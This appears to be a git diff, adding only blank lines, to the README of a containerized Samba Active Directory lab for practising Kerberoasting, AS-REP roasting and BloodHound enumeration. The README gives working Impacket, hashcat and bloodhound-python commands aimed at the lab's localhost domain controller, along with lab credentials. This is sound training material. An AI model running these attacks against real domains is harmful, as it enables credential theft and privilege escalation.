@@ -1,6 +1,7 @@
 # Active Directory Samba DC: Kerberos & AD Attacks Lab
 
 ## Overview
+
 A lightweight containerized **Samba 4 Active Directory Domain Controller (AD DC)** complete with an active Kerberos Key Distribution Center (KDC), LDAP directory services, and SMB shares. Practice fundamental enterprise Active Directory attack vectors—including **Kerberoasting**, **AS-REP Roasting**, and **BloodHound graph enumeration**—without requiring resource-intensive Windows Server virtual machines.
 
 - **Domain**: `LAB.LOCAL`
@@ -48,22 +49,29 @@ A lightweight containerized **Samba 4 Active Directory Domain Controller (AD DC)
 ## How to Solve & Practice
 
 ### 1. Start the Samba AD DC
+
 ```bash
 docker compose up -d
 ```
 
 ### 2. Provision Target Accounts
+
 Run the automated account provisioning script to populate the directory with realistic vulnerable users and SPNs:
+
 ```bash
 ./setup_vulnerable_ad.sh
 ```
+
 This generates:
+
 - **Standard User**: `bob` / `Summer2024!`
 - **Kerberoastable Account**: `svc_mssql` with SPN `MSSQLSvc/db01.lab.local:1433`
 - **AS-REP Roastable Account**: `svc_backup` (Pre-Authentication disabled)
 
 ### 3. AS-REP Roasting with Impacket
+
 From your host (using `impacket` or Kali Linux):
+
 ```bash
 # Query AS-REP for accounts with pre-auth disabled
 GetNPUsers.py lab.local/ -usersfile <(echo -e "svc_backup\nbob\nadministrator") -format hashcat -outputfile asrep.hashes -dc-ip 127.0.0.1
@@ -76,7 +84,9 @@ hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
 ```
 
 ### 4. Kerberoasting with Impacket
+
 Using standard user credentials (`bob:Summer2024!`), request service tickets for registered SPNs:
+
 ```bash
 # Query SPNs and request TGS ticket
 GetUserSPNs.py lab.local/bob:Summer2024! -dc-ip 127.0.0.1 -request -outputfile kerberoast.hashes
@@ -89,7 +99,9 @@ hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt
 ```
 
 ### 5. BloodHound Enumeration in Docker
+
 Collect active directory objects and ACL relationships using `bloodhound-python`:
+
 ```bash
 # Collect domain data
 bloodhound-python -u bob -p 'Summer2024!' -d lab.local -ns 127.0.0.1 -c All --zip
@@ -97,6 +109,7 @@ bloodhound-python -u bob -p 'Summer2024!' -d lab.local -ns 127.0.0.1 -c All --zi
 # BloodHound output will generate a zip archive with JSON files:
 # (users.json, groups.json, computers.json, domains.json)
 ```
+
 Upload the zip file into BloodHound GUI to visualize shortest paths to Domain Admin.
 
 ---
@@ -111,7 +124,9 @@ Upload the zip file into BloodHound GUI to visualize shortest paths to Domain Ad
 ---
 
 ## Quick CLI Control
+
 From the `cyber_lab` root directory:
+
 ```bash
 # Check status
 ./lab status
